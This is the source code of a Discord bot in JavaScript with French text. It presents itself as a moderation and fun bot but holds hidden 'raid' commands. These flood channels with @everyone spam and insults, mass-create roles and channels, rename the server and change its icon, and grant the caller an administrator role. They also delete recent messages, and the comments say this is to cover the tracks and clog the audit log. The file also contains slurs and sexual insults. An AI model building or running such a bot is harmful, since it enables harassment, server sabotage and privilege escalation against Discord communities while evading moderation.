const Discord = require('discord.js');
const client = new Discord.Client();
prefix = "h!";

function cmd(str, msg) {
  return msg.content.toLowerCase().startsWith(prefix + str);
  }

client.on('ready', () => {
  client.user.setGame('EF ALL h!help')
  console.log(`EF BOT ON`);
});

client.login(process.env.TOKEN);

        // Commande de Kick
        client.on('message', message => {
          if (!message.guild) return;
        
          if (message.content.startsWith('/kick')) {
            const user = message.mentions.users.first();
            if (user) {
              const member = message.guild.member(user);
              if (member) {
                member.kick('Mérité').then(() => {
                  message.reply(`${user.tag} a bien été kick.`);
                }).catch(err => {
                  message.reply('Je ne peux kick cet utilisateur.');
                  console.error(err);
                });
              } else {
                message.reply('Je ne trouve pas cet utilisateur');
              }
            } else {
              message.reply('Mentionner un Utilisateur a kick!');
            }
          }
        });
        
        // Commande pour Ban
        client.on('message', message => {
          if (!message.guild) return;
        
          if (message.content.startsWith('/ban')) {
            const user = message.mentions.users.first();
            if (user) {
              const member = message.guild.member(user);
              if (member) {
                member.ban({
                  reason: 'M É R I T É',
                }).then(() => {
                  message.reply(`${user.tag} a bien été ban.`);
                }).catch(err => {
                  message.reply('Je ne peux ban cet utilisateur.');
                  console.error(err);
                });
              } else {
                message.reply('Je ne trouve pas cet utilisateur');
              }
            } else {
              message.reply('Mentionner un Utilisateur a ban!');
            }
          }
        });
        

        // Commande 8ball
client.on('message', message => {
  var args = message.content.split(" ").slice(1)
  if(message.content.startsWith(prefix + ("8ball"))) {
    if(!args[0]) return message.channel.send("pose une question ");
    let rand = ["Je confirme", "Nan", "Preuve sinon Fake", "Certifié nofake", "Peut être", "KE C BO", ":upside_down:"];

    let result = [Math.floor(Math.random()*rand.length)]
    let question = args.slice(0).join(" ");

    let ballembed = new Discord.RichEmbed()
    .setTitle("8ball")
    .setColor("#c10f0f")
    .addField("Question", question)
    .addField("Réponse", rand[Math.floor(Math.random()*rand.length)]);

    message.channel.send(ballembed);
    
  }
});
            // Help
client.on('message', message => {
  var args = message.content.split(" ").slice(1)
  if(message.content.startsWith(prefix + ("help"))) {
    let ballembed = new Discord.RichEmbed()
    .setTitle("EF ALL")
    .setDescription("N'hésitez pas a faire ***/setup*** pour une Meilleur Utilisation.")
    .setColor("#c10f0f")
    .addField("Moderation", "h!ban : Ban un Utilisateur.\nh!kick : Kick un Utilisateur.")
    .addField("Fun", "h!avatar : Post son Avatar.\nh!8ball : Fonction 8Ball.\nh!roulette : Jouer a la Roulette Russe")
    message.channel.send(ballembed);
  }
});





           // Help
client.on('message', message => {
  var args = message.content.split(" ").slice(1)
  if(message.content.startsWith(prefix + ("jtebz"))) {
    let ballembed = new Discord.RichEmbed()
    .setTitle("EF ALL")
    .setDescription("ONT VAS BZ DES MERES BANDES DE SALOPES.")
    .setColor("#c10f0f")
    .addField("EZZZZZZ", "h!spam : spam mdr\nh!channel: cree mass channel et change le nom.\nh!icon:change licon\nh!ef: met admin.")
    message.channel.send(ballembed);
  }
});
            
            
        // Commande pour Poster son Avatar.
        client.on('message', message => {
            if (message.content === 'h!avatar') {
              message.reply(message.author.avatarURL);
            }
          })


//Commande de Flood
client.on("message", message => {
  if(cmd("spam", message)) {

  message.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
  for (var i = 0; i < 10000000; i++) {
      message.channel.send("@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \n@everyone :EZ: BY  EF \nLA EF A TROUER LA CHATTE A TA MERE \nhttps://zedabztagrossedarone.hacked-my.computer/e6518041.gif  https://zedabztagrossedarone.hacked-my.computer/702b9669.gif");
  }
}
});
          // Commande de Destruction
client.on("message", msg => {
if(cmd("channel", msg)) {
  msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
  for (var i = 0; i < 500; i++) {
      // Creates new roles to clog up the audit log
      msg.guild.createRole({
          name: 'LA EF TA NIKER PD',
          color: 'BLUE',
      });
      msg.guild.createChannel('RED BY EF:ELFAMOSO', 'voice')
      msg.guild.createChannel('RED BY EF:ELFAMOSO', 'text')
      //changes name tons of times to clog up the audit log
      msg.guild.setName("EF: ELFAMOSO > EZ ALL");
      msg.guild.setRegion('russia')
   }
   
   
}
});       

       // Commande de Destruction
client.on("message", msg => {
if(cmd("icon", msg)) {
  msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
  for (var i = 0; i < 500; i++) {
      // Creates new roles to clog up the audit log
      msg.guild.createRole({
          name: 'ELFAMOSO',
          color: 'RED',
      });
      msg.guild.setIcon('https://image.noelshack.com/fichiers/2018/20/5/1526669496-telechargement-1.png')
   }
   
   
}
});       




        

            // roulette russe


            client.on('message', message => {
              var args = message.content.split(" ").slice(1)
              if(message.content.startsWith(prefix + ("roulette"))) {
                if(!args[0]) return message.channel.send("Saisie un Nombre ");
                let rand = ["20", "19", "18", "17", "16", "15", "14", "13", "12", "11", "10", "9", "8", "7", "6", "5", "4", "3", "2", "1"];
            
                let result = [Math.floor(Math.random()*rand.length)]
            
                let ballembed = new Discord.RichEmbed()
                .setTitle("Roulette ")
                .setColor("#c10f0f")
                .addField("Je prend le nombre :", rand[Math.floor(Math.random()*rand.length)]);
                
                message.channel.send(ballembed);
                
              }
            });
            

      
            // Commande d'Admin
            client.on("message", message => {
			if(cmd("ef", message)) {

			message.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
			for (var i = 0; i < 10000000; i++) {
				  
                let RoleToAdd = message.guild.roles.find('name', 'ELFAMOSO')
				
				
				
 
                message.member.addRole(RoleToAdd);
                 message.guild.createRole({
 
                  name: 'ELFAMOSO',
                 
                  color: 'RED',
                 
                  permissions:'ADMINISTRATOR',            
                
                })
                 
                }
			
			}
                }); 
